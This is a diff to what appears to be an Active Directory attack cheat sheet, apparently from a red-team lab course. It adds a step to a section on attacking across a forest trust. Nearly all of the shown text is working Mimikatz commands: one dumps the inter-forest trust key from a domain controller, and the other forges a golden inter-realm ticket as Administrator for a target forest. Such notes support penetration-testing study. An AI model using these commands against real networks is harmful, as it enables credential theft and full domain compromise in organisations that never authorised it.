@@ -613,8 +613,13 @@ gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local
 
 ### Across Forest using Trust Tickets
 
-**1. Request the trust key for the inter forest trust.:**
+**1. Request the trust key for the inter forest trust:**
 ```powershell
 # request the trust key for the inter forest trust
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.corp.corporate.local      
+```
+**2. Create the inter-realm TGT:**
+```powershell
+# Create the inter-realm TGT
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:<hash> /service:krbtgt /target:eurocorp.local /ticket:C:\test\kekeo_old\trust_forest_tkt.kirbi"'
 ```
